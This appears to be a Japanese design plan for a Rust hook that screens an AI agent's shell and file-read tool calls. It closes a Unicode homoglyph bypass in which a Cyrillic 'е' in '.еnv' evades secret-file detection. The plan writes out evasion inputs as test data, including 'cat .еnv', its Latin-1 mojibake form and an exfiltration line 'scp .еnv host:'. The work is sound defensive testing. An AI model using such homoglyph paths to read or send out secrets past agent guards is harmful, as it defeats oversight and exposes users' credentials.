# Plan: Unicode homoglyph fold (`cat .еnv` bypass) — issue #163

## Context

`tests/bypass/corpus.jsonl` の `gap-unicode-homoglyph` (ADR 0001 / 0002 B1)
が、キリル文字 `е` (U+0435) を含む `.еnv` を ASCII needle `.env` に一致させず
allow している。汎用 NFKC + confusables は表が巨大で依存追加を要するため
defer されていた。本 issue は **機密 needle に現れる英小文字の lookalike
だけ**を手書き fold table で ASCII に畳み、依存ゼロで GAP を閉じる。

#161 / #162 とは独立。

## 現状の穴 (実測)

1. **ファイルツール経路** (`classify` / Read): JSON は UTF-8 なので token は
   本物の `.еnv`。`needle_mask` / `(?i-u:\.env)` は ASCII のみ → miss。
2. **Bash 経路** (`matches_sensitive_path`): `shell::parse` → `push_latin1` が
   非 ASCII byte を Latin-1 化するため、UTF-8 `е` (`D0 B5`) は argv 上
   `.Ðµnv` (U+00D0 U+00B5) になる。こちらも ASCII needle に不一致。
3. したがって fold 前に **「全 char ≤ U+00FF なら byte 列に戻して UTF-8
   再デコードを試みる」** が必須。パーサ本体 (`push_latin1` / word 表現) は
   触らない (fuzz 不変条件・既存スナップショット波及回避)。

## 設計方針 (ponytail)

| 採る | 採らない |
| --- | --- |
| 手書き `match` fold table (~30–40 エントリ) | `unicode-normalization` / confusables クレート |
| `src/facts/sensitive.rs` に 1 ヘルパ、両呼び出し側から再利用 | `patterns.rs` への table 複製 |
| ASCII-only は `Cow::Borrowed` (コスト 0) | 全 token の常時 allocate |
| fold 不能 / デコード不能は素通し | 「非 ASCII は一律 ask」(正当な `資料.txt` で FP) |
| パーサは据え置き、classify 側で再デコード | `push_latin1` の UTF-8 化 (波及大) |

### API (案)

`src/facts/sensitive.rs` に `pub(crate)`:

```rust
/// ASCII-only → Borrowed (zero cost).
/// Else: optional Latin-1→UTF-8 recovery, then lookalike→ASCII fold.
pub(crate) fn fold_sensitive_homoglyphs(token: &str) -> Cow<'_, str>
```

内部:

1. `token.is_ascii()` → `Cow::Borrowed(token)` で即 return。
2. **Latin-1 再デコード (Bash 経路専用の前処理)**: 全 `char` が
   `≤ U+00FF` のときだけ `bytes = token.chars().map(|c| c as u8)` を
   `str::from_utf8` で再デコード。成功したら recovered を fold 対象に、
   失敗 / 条件不一致なら元 token のまま fold。
   - 本物 UTF-8 `.еnv` (Read 経路): `е` は U+0435 > U+00FF → 再デコード
     スキップ → 直後の fold table が `е→e`。
   - Bash mojibake `.Ðµnv`: 全 char ≤ FF → 再デコードで `.еnv` 復元 → fold。
3. char 単位で `fold_char(c) -> char` (`match` table)。変化が無ければ
   Borrowed / 元の recovered を返し、1 文字でも変われば `String` を Owned で返す。

`fold_char` の対象は needle 英字の lookalike のみ (Cyrillic
`а/е/о/р/с/у/х/і/ѕ/…`、Greek `α/ο/ρ/ν/ι/τ/υ/κ/η/…` 等)。大文字 lookalike も
同 table に載せ、後段の既存 ASCII case-fold (`(?i-u:…)` /
`eq_ignore_ascii_case`) に任せる。

### 適用位置 (必須: 両側)

`pbt_sensitive_path_matches_classify` が片側のみ変更を CI で落とす。

1. **`classify_into`** — `needle_mask` / regex **の前**に fold。
   `let folded = fold_sensitive_homoglyphs(token);` し、mask・`find_iter` は
   `folded.as_ref()` に対して実行。`SensitivePath.raw` は folded 上の match
   (既存どおり `m.as_str()`)。表示用に original を残す必要は無し。
2. **`matches_sensitive_path`** — 同様に先頭で
   `let folded = crate::facts::sensitive::fold_sensitive_homoglyphs(token);`
   し、needle prefilter と `SENSITIVE_PATH.is_match` を folded に適用。

`check_needles_at` / `PROBES` / `SENSITIVE_NEEDLES` の needle 集合は不変
(issue 明記)。fold 後に ASCII needle が現れるだけ。

### fail-closed / FP

- fold table 外の非 ASCII → 分類不変 (素通し)。
- 正当な非 ASCII ファイル名 (`資料.txt`) は needle にならない → FP ≈ 0。
- I/O なし・純粋・O(len)。

## 実装段階 (TDD)

### Phase 0 — 失敗テスト先行

1. `src/facts/sensitive.rs` tests:
   - `classify(".еnv")` → `Dotenv` (本物 UTF-8)
   - `classify` に Latin-1 mojibake `.Ðµnv` (`"\u{00D0}\u{00B5}"` 形) → `Dotenv`
   - 負例: `classify("資料.txt")` / table 外 char 混じり → empty
2. `src/rules/patterns.rs` tests:
   - `matches_sensitive_path(".еnv")` / mojibake 形 → true
3. `src/rules/sensitive_bash_read.rs`:
   - `gap_unicode_homoglyph_normalizes_or_flags` を `assert_ask("cat .еnv")` に
     書き換え (現状 `assert_silent` pin を反転)
4. まだ実装が無いので red。

### Phase 1 — fold ヘルパ + 両側統合

1. `fold_char` + `fold_sensitive_homoglyphs` を `sensitive.rs` に追加。
2. `classify_into` / `matches_sensitive_path` に接続。
3. Phase 0 テスト green。

### Phase 2 — corpus / exfil / PBT

1. `tests/bypass/corpus.jsonl`:
   - `gap-unicode-homoglyph` を `must_catch` / `ask` に反転 (同一 PR 必須)。
     id は `bash-read-unicode-homoglyph` 等にリネーム可 (既存 id 維持でも可)。
   - 追加: `scp .еnv host:` → `must_catch` / `deny`
     (`sensitive-path-to-network`)。
2. `src/testing/proptest.rs`:
   - needle 1 文字を table 内 homoglyph に置換する strategy。
3. PBT (`sensitive.rs` または `patterns.rs`):
   - 「homoglyph 置換 token は fold 後に元 needle と同じ分類」
   - 「table 外非 ASCII は分類を変えない」
   - 既存 `pbt_sensitive_path_matches_classify` は両側 fold で自動パリティ維持。
     必要なら strategy を ASCII 外に少し拡張 (任意、P2)。

### Phase 3 — ADR / 設計書

1. **`docs/adr/0007-unicode-homoglyph-fold-2026-07.md`** (新規 Accepted):
   - Context: ADR 0001/0002 B1 defer 理由と、有界 needle による覆し。
   - Decision: 手書き fold + Latin-1 再デコード、適用位置、fail-closed。
   - Consequences / Known limitations: 汎用 confusables は引き続き対象外、
     table 外 lookalike・パーサ Latin-1 契約は維持。
2. ADR 0001 / 0002 の Known limitations から B1 / Unicode homoglyph 行を
   「Resolved by ADR 0007」に更新 (0005 の Resolved 追記スタイルに合わせる)。
3. `docs/design/policy-packs.md` `core.secrets` 節に 1 段落:
   機密 path 照合前に needle-lookalike を ASCII fold する旨。
4. `docs/review/substantive-test-checklist.md` の
   `gap_unicode_homoglyph_normalizes_or_flags` 行を改善後期待に更新。

### Phase 4 — ゲート

`make check` (fmt / clippy / test / doc / deny)。corpus 反転と pin 書き換えは
同一コミット群で落とさないこと。

## 変更ファイル

| ファイル | 変更 |
| --- | --- |
| `src/facts/sensitive.rs` | fold table + UTF-8 再デコード + `classify_into` 統合 + unit/PBT |
| `src/rules/patterns.rs` | `matches_sensitive_path` で同一 fold 適用 + unit |
| `src/rules/sensitive_bash_read.rs` | pin テストを ask 期待に |
| `tests/bypass/corpus.jsonl` | gap → must_catch + scp exfil 追加 |
| `src/testing/proptest.rs` | homoglyph 置換 strategy (任意だが推奨) |
| `docs/adr/0007-…md` | 新規 |
| `docs/adr/0001-…` / `0002-…` | Known limitations 更新 |
| `docs/design/policy-packs.md` | 1 段落追記 |
| `docs/review/substantive-test-checklist.md` | 行更新 |

触らない: `src/facts/shell.rs` の `push_latin1` / word 表現、`PROBES` /
`SENSITIVE_NEEDLES` 集合、新規クレート。

## リスクと緩和

| リスク | 緩和 |
| --- | --- |
| 片側のみ fold → パリティ PBT 失敗 | 両側から同一 `pub(crate)` ヘルパ |
| `needle_mask` が fold 前に走ると miss | fold を mask / regex **より前**に置く |
| Bash mojibake 未考慮で unit は通るが corpus 失敗 | mojibake 形の unit + 実 `cat .еnv` corpus |
| table 肥大化 | needle 英字の lookalike のみ。汎用は ADR で明示 defer |
| FP on 日本語ファイル名 | fail-closed 素通し方針をテストで pin |

## 検証サマリ (update-plan)

| カテゴリ | 点数 | 所見 |
| --- | --- | --- |
| モジュール / 構造体設計 | 19 / 20 | fold は `sensitive.rs` に単一 `pub(crate)`。`patterns` は呼び出しのみ。新規型なし |
| フック契約 | 20 / 20 | PreToolUse I/O・`Decision` スキーマ不変。ルール発火が allow→ask/deny に厳格化されるだけ |
| 判定ルール / ポリシー | 19 / 20 | 既存 `SENSITIVE_PATH` / `classify` shape 不変。homoglyph のみ追加捕捉。一律非 ASCII ask は採らない |
| エラーハンドリング | 20 / 20 | 純粋関数・`Result` 不要・`unwrap` なし。デコード失敗は素通し |
| テスト容易性 | 19 / 20 | TDD 段階明示、corpus 反転同一 PR、パリティ PBT・正負 PBT・mojibake unit |
| **合計** | **97 / 100** | 実装 ready (≥ 90) |

### 整合性

- 参照シンボル (`classify_into`, `matches_sensitive_path`,
  `pbt_sensitive_path_matches_classify`, `gap_unicode_homoglyph_normalizes_or_flags`,
  `push_latin1`, corpus id `gap-unicode-homoglyph`) はいずれも現行 `src/` /
  `tests/` に実在。
- ADR 採番: 既存最大は 0006 → **0007** が正しい。
- 段階順: 失敗テスト → ヘルパ → 両側接続 → corpus/PBT → ADR/docs →
  `make check`。依存前後に問題なし。

### 改善反映済み (プラン作成時)

- P0: Bash Latin-1 mojibake を「要注意」から **必須手順** として Phase 0/1 に固定。
- P0: `needle_mask` より前に fold する順序を明記 (順序誤りは silent miss)。
- P1: table を両ファイルに置かず `sensitive.rs` 単一ソースに固定 (パリティ事故防止)。
